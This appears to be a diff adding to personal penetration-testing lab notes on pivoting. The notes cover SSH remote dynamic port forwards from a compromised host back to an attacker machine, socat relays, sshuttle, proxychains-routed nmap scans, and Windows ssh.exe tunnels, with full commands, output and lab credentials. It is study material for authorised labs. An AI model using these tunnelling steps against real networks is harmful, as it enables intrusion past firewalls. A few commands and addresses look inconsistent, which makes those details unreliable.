@@ -248,7 +248,6 @@ Difference from previous Port Forwarding:
 	- Packets are tunneled through the listening port to the *SSH server*
 	- Packets are then forwarded through the server by the socket we specify
 
-
 ## Local Port Forward
 - Can only connect to one socket per SSH Connection
 #### Scenario
@@ -660,12 +659,213 @@ psql -h 127.0.0.1 -p 2345 -U postgres
 	postgres=# 
 ```
 
+## Remote Dynamic Port Forward
+
+Similar to Local Dynamic port forwarding, Remote creates a dynamic port forward but in the remote configuration
+- SOCKS proxy port is _bound to the SSH server_
+- Traffic is _forwarded from the SSH client_.
+- Able to connect to other ports and hosts through the same connection
+
+> OpenSSH _client_ needs to be version 7.6 or above to use it - the server version doesn't matter.
+
+#### Extended Scenario
+![](remote_dynamic_port_forward.png)
+
+- Windows server (MULTISERVER03) on the DMZ network.
+- Firewall prevents
+	- Connecting to any port on MULTISERVER03
+	- Any port other than TCP/8090 on CONFLUENCE01 from our Kali machine
+- Can SSH _out_ from CONFLUENCE01 _to our Kali machine_, then create a remote dynamic port forward so we can start enumerating MULTISERVER03 from Kali.:
+	- SSH session is initiated from CONFLUENCE01, connecting to Kali
+	- Kali is running an SSH server
+	- SOCKS proxy port is then bound to the Kali machine on TCP/9998.
+	- Packets sent to that port will be pushed back through the SSH tunnel to CONFLUENCE01
+	- Packets are forwarded based on where they're addressed - in this case, MULTISERVER03.
+
+#### Execution
+
+CONFLUENCE01 - **192.168.228.63**
+PGDATABASE01 - **10.4.228.215**
+MULTISERVER03 - **192.168.228.64**
+
+- Per previous, gain reverse shell on CONFLUENCE01 via curl & CVE vuln
+- Upgrade to TTY
+- Start SSH Dynamic Remote Port Forward
+```bash
+ssh -N -R 9998 kali@192.168.45.196
+	Could not create directory '/home/confluence/.ssh'.
+	The authenticity of host '192.168.45.196 (192.168.45.196)' can't be established.
+	ECDSA key fingerprint is SHA256:Z6AWTPQLtEMVjOkkRmrchK5U1cx9L6Dek+5Gx8+icic.
+	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+	yes
+	Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_hosts).
+	kali@192.168.45.196's password:
+```
+
+- Edit proxychains config file and exploit
+```bash
+sudo vim /etc/proxychains4.conf
+	# Last line
+	socks5 127.0.0.1 9998
 
 
+proxychains nmap -vvv -sT -Pn -n --top-ports=20 10.4.228.64
+	...
+	PORT     STATE  SERVICE       REASON
+	21/tcp   closed ftp           conn-refused
+	22/tcp   closed ssh           conn-refused
+	23/tcp   closed telnet        conn-refused
+	25/tcp   closed smtp          conn-refused
+	53/tcp   open   domain        syn-ack
+	80/tcp   open   http          syn-ack
+	110/tcp  closed pop3          conn-refused
+	111/tcp  closed rpcbind       conn-refused
+	135/tcp  open   msrpc         syn-ack
+	139/tcp  closed netbios-ssn   conn-refused
+	143/tcp  closed imap          conn-refused
+	443/tcp  closed https         conn-refused
+	445/tcp  closed microsoft-ds  conn-refused
+	993/tcp  closed imaps         conn-refused
+	995/tcp  closed pop3s         conn-refused
+	1723/tcp closed pptp          conn-refused
+	3306/tcp closed mysql         conn-refused
+	3389/tcp open   ms-wbt-server syn-ack
+	5900/tcp closed vnc           conn-refused
+	8080/tcp closed http-proxy    conn-refused
+	...
+```
 
 
+## sshuttle
+- Turns an SSH connection into something similar to a VPN by setting up local routes that force traffic through the SSH tunnel.
+- Requires:
+	- **root** privs on the SSH client
+	- python3 on SSH server
+
+In situations where we have direct access to an SSH server, behind which is a more complex internal network, classic dynamic port forwarding might be difficult to manage.
+
+#### Scenario
+- Have SSH access to PGDATABASE01,
+- Can access through a port forward set up on CONFLUENCE01
+
+#### Execution
+
+CONFLUENCE01 - **192.168.154.63**
+PGDATABASE01 - **10.4.154.215**
+HRSHARES - **172.16.154.217**
+
+- Set up a port forward in a shell on CONFLUENCE01, listening on port 2222 on the WAN interface and forwarding to port 22 on PGDATABASE01
+```bash
+socat TCP-LISTEN:2222,fork TCP:10.4.154.215:22
+```
+
+- Run **sshuttle**, specifying the SSH connection string we want to use, & the subnets that we want to tunnel through this connection
+	- PGDATABASE01 - **10.4.154.0/24** and HRSHARES - **172.16.154.0/24**)
+```bash
+sshuttle -r database_admin@192.168.154.63:2222 10.4.154.0/24 172.16.154.0/24
+	The authenticity of host '[192.168.154.63]:2222 ([192.168.154.63]:2222)' can't be established.
+	ED25519 key fingerprint is SHA256:oPdvAJ7Txfp9xOUIqtVL/5lFO+4RY5XiHvVrZuisbfg.
+	This host key is known by the following other names/addresses:
+	    ~/.ssh/known_hosts:3: [hashed name]
+	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+	Warning: Permanently added '[192.168.154.63]:2222' (ED25519) to the list of known hosts.
+	database_admin@192.168.154.63's password: 
+	c : Connected to server.
+```
+
+> Any requests made to hosts in the subnets specified will be pushed transparently through the SSH connection
+
+- Test by connecting to the smb shares on HRSHARES via a new Kali tab
+```bash
+smbclient -L //172.16.154.217/ -U hr_admin --password=Welcome1234
+	        Sharename       Type      Comment
+	        ---------       ----      -------
+	        ADMIN$          Disk      Remote Admin
+	        C$              Disk      Default share
+	        IPC$            IPC       Remote IPC
+	        Scripts         Disk      
+	        Users           Disk      
+	Reconnecting with SMB1 for workgroup listing.
+	do_connect: Connection to 172.16.154.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+	Unable to connect with SMB1 -- no workgroup available
+```
 
 
+## Windows
+
+### ssh.exe
+
+- **%systemdrive%\\Windows\\System32\\OpenSSH**
+	- Default directory for SSH Utilities (ssh, scp, sftp, etc)
+- Requires v7.6 or higher
+
+#### Scenario
+![](ssh-tunnel-windows.png)
+
+#### Execution
+
+- Start up an SSH server on Kali
+```bash
+sudo systemctl start ssh
+```
+
+- RDP into MULTISERVER03 w/ previously found credentials
+```bash
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.216.64
+```
+
+- Find ssh, check version, & create a dynamic port forward to kali
+```powershell
+where ssh
+	C:\Windows\System32\OpenSSH\ssh.exe
+
+ssh.exe -V
+	OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
+
+ssh -N -r 9998 kali@192.168.45.204
+	The authenticity of host '192.168.45.204 (192.168.45.204)' can't be established.
+	ECDSA key fingerprint is SHA256:Z6AWTPQLtEMVjOkkRmrchK5U1cx9L6Dek+5Gx8+icic.
+	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+	Warning: Permanently added '192.168.45.204' (ECDSA) to the list of known hosts.
+	kali@192.168.45.204's password:
+```
+
+- Verify connection on Kali
+```bash
+ss -ntplu
+	Netid          State           Recv-Q          Send-Q                   Local Address:Port                      Peer Address:Port          Process
+	udp            UNCONN          0               0                              0.0.0.0:34960                          0.0.0.0:*
+	tcp            LISTEN          0               128                          127.0.0.1:9998                           0.0.0.0:*
+```
+
+- Update proxychains conf to use the socket
+```bash
+sudo vim /etc/proxychains4.conf
+	...
+	[ProxyList]
+	# add proxy here ...
+	# meanwile
+	# defaults set to "tor"
+	# socks4        127.0.0.1 9050
+	socks5 127.0.0.1 9998
+```
+
+- Use proxychains on Kali to connect to the PostgreSQL db
+```bash
+proxychains psql -h 10.4.216.215 -U postgres
+	[proxychains] config file found: /etc/proxychains4.conf
+	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+	[proxychains] DLL init: proxychains-ng 4.17
+	[proxychains] DLL init: proxychains-ng 4.17
+	[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.216.215:5432  ...  OK
+	Password for user postgres: 
+	[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.216.215:5432  ...  OK
+	psql (16.2 (Debian 16.2-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
+	SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
+	Type "help" for help.
+	
+postgres=#
+```
 
 
 # Removed from course
